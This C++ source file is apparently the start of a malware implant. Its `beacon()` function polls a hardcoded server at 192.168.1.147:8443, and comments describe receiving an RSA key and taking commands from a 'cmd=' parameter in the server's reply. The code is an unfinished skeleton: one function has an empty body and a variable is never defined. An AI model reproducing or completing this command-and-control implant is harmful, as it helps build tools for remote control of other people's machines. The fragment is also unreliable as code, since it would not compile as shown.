#include "implant.h"
#include "xhttp.h"

#include <iostream>

namespace implant {

std::string initConnection() {
    // Generate random ID
    // Make GET connection with a cookie named ID: 
    // Receive public RSA key
    //


}

// Make a get request to the server with the ID
// Server will respond with or without a cmd= parameter.
// If no cmd= parameter then continue loop
// 

std::string beacon() {
    std::string url = "http://192.168.1.147:8443/home";
    std::cerr << url << std::endl;
    std::string response = xhttp::http_get(url, RequestParam);
    std::cerr << response << std::endl;
    return response;
}

}